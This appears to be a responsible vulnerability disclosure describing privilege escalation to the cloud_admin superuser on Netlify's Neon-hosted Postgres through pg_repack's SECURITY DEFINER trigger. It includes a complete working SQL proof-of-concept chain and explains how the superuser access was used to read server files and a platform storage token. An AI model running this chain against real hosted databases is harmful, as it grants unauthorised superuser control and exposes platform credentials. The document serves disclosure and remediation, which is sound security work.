# Netlify Postgres: privesc to cloud_admin superuser via pg_repack

## Summary

`POST app.netlify.com/.netlify/functions/database-query` runs arbitrary SQL as `netlifydb_owner` on a Neon-hosted Postgres. A chain of documented components escalates that role to `cloud_admin` (full superuser) and reads platform secrets (`neon.storage_token`, 1-year JWT, `iss=neon.controlplane`). Reproduced end-to-end on **two independent accounts/sites** (fresh databases).

**Chain**: any site owner can `CREATE EXTENSION pg_repack` (Neon default since Aug 2025) → `repack` schema is writable by `neon_superuser`, and `netlifydb_owner` is an INHERIT member of `neon_superuser` → official `repack.repack_trigger()` (SECURITY DEFINER, owner=`cloud_admin`) writes to `repack.log_<oid>`, a table the user can pre-create with their own trigger on it → user trigger fires **as `cloud_admin`** → arbitrary SQL as superuser.

## Repro (all through database-query; site B fresh DB, oid 24614)

```sql
-- 1. install + confirm schema write access
CREATE EXTENSION pg_repack;
--    repack schema ACL: cloud_admin=UC, neon_superuser=UC (inherited by netlifydb_owner)

-- 2. pre-create the exact table repack_trigger will write to
CREATE TABLE k_src(id int, v text);                       -- oid 24614
CREATE TYPE  repack.pk_24614    AS (id int);
CREATE TABLE repack.log_24614 (pk repack.pk_24614, row k_src);

-- 3. amplification: user trigger on the log table + official trigger on source
CREATE FUNCTION k_evil() RETURNS trigger LANGUAGE plpgsql AS $q$
BEGIN EXECUTE 'CREATE TABLE k_pwned AS SELECT current_user u'; RETURN NEW; END $q$;
CREATE TRIGGER t1 AFTER INSERT ON repack.log_24614 FOR EACH ROW EXECUTE FUNCTION k_evil();
CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id');

-- 4. one INSERT fires everything; k_evil ran as cloud_admin
INSERT INTO k_src VALUES (1,'x');
SELECT tableowner FROM pg_tables WHERE tablename='k_pwned';  -- cloud_admin
SELECT * FROM k_pwned;                                       -- u=cloud_admin
```

## Impact (verified)

- Arbitrary SQL as `cloud_admin` (superuser): e.g. server file read:
  `pg_read_file('postgresql.conf')` → `neon.storage_token` (JWT, **~1 year, `iss=neon.controlplane`**, `scope=tenant`), internal pageserver/safekeeper URLs, control-plane endpoints; also `/etc/passwd`, monitoring YAML with a `cloud_admin` DSN.
- Defeats the documented "Neon users are not superusers" boundary (`-k/--no-superuser-check` docs); systemic — any Netlify Postgres site, reproducible from a fresh DB.
- Confined to the tenant's own compute (no cross-tenant access; siteId checks strict).

## Root cause

Upstream pg_repack is safe only because `repack` schema is writable solely by the superuser installing it. Neon grants it to `neon_superuser` (Aug 2025 "new repack schema permission"), and every DB-owner role is a member of `neon_superuser` — so users can plant triggers on tables that the `cloud_admin` SECURITY DEFINER function writes to. Postgres fires them in the definer context.

## Fix

1. `REVOKE CREATE ON SCHEMA repack FROM neon_superuser` after extension install (runtime objects don't need it).
2. Harden `repack_trigger`: verify log-table owner before INSERT.
3. Stop exposing `storage_token` / `pageserver_connection_info` via readable config.

## Cleanup

All test objects removed on both accounts; re-checked zero residue; `pg_repack` dropped again on site B (original state). No other user's data touched; only throwaway tables created/deleted.

## Refs

pg_repack `lib/pg_repack.sql.in:340-343` (SECURITY DEFINER) + `lib/repack.c` (trigger SQL); Neon changelog 2025-08-15/29; Neon issue #51 (extensions owned by `cloud_admin`); Neon pg_repack docs.
